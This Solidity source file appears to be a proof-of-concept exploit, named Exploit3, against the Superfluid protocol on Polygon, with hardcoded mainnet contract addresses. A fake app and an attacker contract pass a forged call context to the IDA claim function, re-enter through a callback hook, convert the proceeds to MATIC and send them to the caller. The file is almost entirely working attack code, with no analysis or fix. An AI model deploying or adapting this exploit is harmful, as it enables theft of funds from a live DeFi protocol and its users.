// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "src/Common.sol";
import "forge-std/Test.sol";

contract FakeApp {

    ISuperfluid superfluid;
    IIDA ida;
    MATICx maticx;
    address subscriber;

    constructor(ISuperfluid _superfluid, IIDA _ida, MATICx _maticx, address _subscriber) {
        superfluid = _superfluid;
        ida = _ida;
        maticx = _maticx;
        subscriber = _subscriber;
    }

    function initialize() public payable {
        require(msg.value > 0, "give me some funds");
        // get some maticx
        maticx.upgradeByETH{value: msg.value}();
    }

    function create_index() public {
        // create index
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.createIndex.selector, maticx, 0, ""),
            ""
        );
    }

    function update_subscription(uint256 unit) public {
        // update subscription
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.updateSubscription.selector, maticx, 0, subscriber, unit, ""),
            ""
        );
    }

    function update_index(uint256 indexValue) public {
        // update index
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.updateIndex.selector, maticx, 0, indexValue, ""),
            ""
        );
    }

    function redeemAll() public {
        //maticx.downgradeToETH(1);
        payable(subscriber).transfer(address(this).balance);
    }

    receive() external payable {

    }
}

contract Exploit3Inner {

    ISuperfluid public superfluid;
    ICFA public cfa;
    IIDA ida;
    IERC20 public usdc;
    IERC20 public qi;
    WMATIC public wmatic;
    ISuperToken public usdcx;
    ISuperToken public ricx;
    ISuperToken public miva;
    ISuperToken public qix;
    MATICx public maticx;
    ISwapFactory public swapFactory;
    Receiver public receiver;
    ISwapPair public usdcPool; // WMATIC-USDC pool
    ISwapPair public mivaPool; // WMATIC-MIVA pool
    ISwapPair public qiPool;

    FakeApp fakeApp;

    event SMTM(address receiver, uint amount);


    constructor() {
        superfluid = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
        // input: 0xCAa7349CEA390F89641fe306D93591f87595dc1F (USDCx)
        // output: 0x263026E7e53DBFDce5ae55Ade22493f828922965 (RICx)
        ida = IIDA(0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1);
        cfa = ICFA(0x6EeE6060f715257b970700bc2656De21dEdF074C);
        usdcx = ISuperToken(0xCAa7349CEA390F89641fe306D93591f87595dc1F);
        ricx = ISuperToken(0x263026E7e53DBFDce5ae55Ade22493f828922965); // RICx for superapp
        miva = ISuperToken(0xC0b2983A17573660053BEEED6FDb1053107cf387);
        qix = ISuperToken(0xe1cA10e6a10c0F72B74dF6b7339912BaBfB1f8B5);
        maticx = MATICx(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);
        swapFactory = ISwapFactory(0x5757371414417b8C6CAad45bAeF941aBc7d3Ab32); // quickSwap factory
        usdc = IERC20(usdcx.getUnderlyingToken());
        qi = IERC20(qix.getUnderlyingToken());
        wmatic = WMATIC(maticx.getUnderlyingToken());
        usdcPool = ISwapPair(swapFactory.getPair(address(wmatic), address(usdc))); // WETH-USDC pool
        mivaPool = ISwapPair(swapFactory.getPair(address(wmatic), address(miva))); // WETH-MIVA pool
        qiPool = ISwapPair(swapFactory.getPair(address(wmatic), address(qi))); // WETH-QI pool

        fakeApp = new FakeApp(superfluid, ida, maticx, address(this));
    }

    function sell_tokens(ISwapPair pool) internal returns (uint256) {
        uint112 reserveIn;
        uint112 reserveOut;
        uint256 amountIn;
        uint256 amountOut;
        uint256 wmaticAmount;
        wmaticAmount = wmatic.balanceOf(address(this));
        IERC20 token0 = IERC20(pool.token0());
        IERC20 token1 = IERC20(pool.token1());
        require(address(token0) == address(wmatic), "token0 is not WMATIC");
        (reserveOut, reserveIn, ) = pool.getReserves();
        amountIn = token1.balanceOf(address(this));
        amountOut = SwapUtils.getAmountOut(amountIn, reserveIn, reserveOut);
        token1.transfer(address(pool), amountIn);
        pool.swap(amountOut, 0, address(this),"");
        wmaticAmount = wmatic.balanceOf(address(this)) - wmaticAmount;
        return wmaticAmount;
    }

    function buy_tokens(ISwapPair pool, uint256 maticAmount) internal returns (uint256) {
        uint112 reserveIn;
        uint112 reserveOut;
        IERC20 token0 = IERC20(pool.token0());
        IERC20 token1 = IERC20(pool.token1());
        require(address(token0) == address(wmatic));
        maticx.upgradeByETH{value: maticAmount}();
        maticx.downgrade(maticAmount);
        token0.transfer(address(pool), maticAmount);
        (reserveIn, reserveOut,) = pool.getReserves();
        pool.swap(0, SwapUtils.getAmountOut(maticAmount, reserveIn, reserveOut), address(this), "");
        return token1.balanceOf(address(this));
    }

    function claimWithContext(Context memory _ctx) internal returns (bytes memory) {
        bytes memory ctx = ContextDefinitions.serializeContext(_ctx);
        bytes memory originalCtx;
        bytes memory returnData;
        returnData = ida.claim(maticx, address(fakeApp), 0, address(this), ctx);
        return ctx;
    }

    function fire() public payable {

        Context memory context;
        context.callType = ContextDefinitions.CALL_INFO_CALL_TYPE_APP_CALLBACK;
        context.timestamp = 0;
        context.msgSender = address(this);
        context.userData = "";

        // create index
        fakeApp.initialize{value: msg.value}();
        fakeApp.create_index();

        // update subscription
        fakeApp.update_subscription(maticx.balanceOf(address(fakeApp)));

        // update index
        fakeApp.update_index(1);

        claimWithContext(context);
        maticx.downgradeToETH(maticx.balanceOf(address(this)));
        payable(tx.origin).transfer(address(this).balance);
    }

    function appCallbackPush(
        bytes calldata ctx,
        ISuperApp app,
        uint256 appAllowanceGranted,
        int256 appAllowanceUsed,
        ISuperfluidToken appAllowanceToken
    )
        external
        returns (bytes memory appCtx) {
        appCtx = ctx;
    }

    function callAppBeforeCallback(
        ISuperApp app,
        bytes calldata callData,
        bool isTermination,
        bytes calldata ctx
    ) external returns(bytes memory cbdata) {
        bytes memory a = "";
        // set to approved
        superfluid.callAgreement(
            ida,
            abi.encodeWithSelector(IIDA.claim.selector, maticx, address(fakeApp), 0, address(this), ""),
            ""
        );
        cbdata = a;
    }

    function appCallbackPop(
        bytes calldata ctx,
        int256 appAllowanceUsedDelta
    )
        external
        returns (bytes memory newCtx)
    {
        newCtx = ctx;
    }

    function callAppAfterCallback(
        ISuperApp app,
        bytes calldata callData,
        bool isTermination,
        bytes calldata ctx
    )
        external
        returns(bytes memory newCtx) {
        newCtx = ctx;
    }

    function getAppManifest(address appAddress) external pure returns (bool, bool, uint256) {
        return (true, false, 0);
    }

    function decodeCtx(bytes memory ctx) public pure returns (Context memory context)
    {
        return ContextDefinitions.unserializeContext(ctx);
    }
        

    receive() external payable {

    }
}

contract Exploit3 {
    function fire() public payable {
        Exploit3Inner exp = new Exploit3Inner();
        exp.fire{value: msg.value}();
    }
}